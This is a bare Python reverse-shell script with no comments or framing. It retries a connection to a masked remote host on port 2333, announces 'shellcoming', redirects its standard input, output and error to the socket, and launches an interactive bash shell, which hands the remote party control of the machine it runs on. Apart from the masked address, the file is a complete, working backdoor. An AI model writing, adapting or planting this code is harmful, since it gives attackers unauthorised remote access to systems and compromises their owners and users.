from socket import *
import subprocess
import os, threading
import time



def func():
    s=socket(AF_INET,SOCK_STREAM)
    while 1>0:
        try:
            s.connect(('***',2333))
            s.sendall("shellcoming\n")
            break
        except:
            time.sleep(10)
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash","-i"]);
func()